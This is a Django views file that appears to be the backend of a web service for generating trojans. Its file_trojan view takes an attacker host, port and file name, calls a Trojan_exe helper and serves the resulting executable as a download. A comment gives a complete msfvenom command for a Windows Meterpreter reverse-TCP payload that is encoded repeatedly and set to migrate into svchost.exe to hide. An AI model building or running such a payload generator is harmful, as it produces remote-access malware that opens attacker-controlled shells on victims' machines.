from django.shortcuts import render,HttpResponse
from django.http import FileResponse,Http404
from msfapi.method import  *
from msfapi.msfveonm import *
import os

# Create your views here.
def msf(request):
    # search = request.POST.get('search')
    search = request.GET.get('cmd')
    # data =test(search)
    data= "hello"
    # response=HttpResponse(data)
    response = HttpResponse(data, content_type='application/html')
    return response


def read(request):
    res=request.META
    print(res)


def file_trojan(request):
    #——————————————————————————————————
    # file_path='static/files/test.txt'
    # with open(file_path) as f:
    #     data = f.read()
    # response = HttpResponse(data, content_type='application/txt')
    # response['Content-Disposition'] = 'attachment; filename=' + os.path.basename(file_path)
    # return response
    #msfvenom -p windows/meterpreter/reverse_tcp -a x86 
    # --platform LHOST=XXX LPORT=XXX -e x86/shikata_ga_nai
    #  -i 12 -b '\x00\' PrependMigrate=true PrependMIgrateProx=svchost.exe
    #   -f c > /root/Desktop/shellcode.c
    #——————————————————————————————————
    host = request.GET.get('lhost')
    port = request.GET.get('lport')
    name=request.GET.get('name')
    status=Trojan_exe(host,port,name)
    if status==1:
        return HttpResponse("下载出错了")
    else:
        file_path='static/files/%s'%(name)
        try:
            response = FileResponse(open(file_path, 'rb'))
            response['content_type'] = "application/octet-stream"
            response['Content-Disposition'] = 'attachment; filename=' + os.path.basename(file_path)
            return response
        except Exception as result:
            print('检测出异常{}'.format(result))
            return HttpResponse("下载出错了")
        
        

    # pass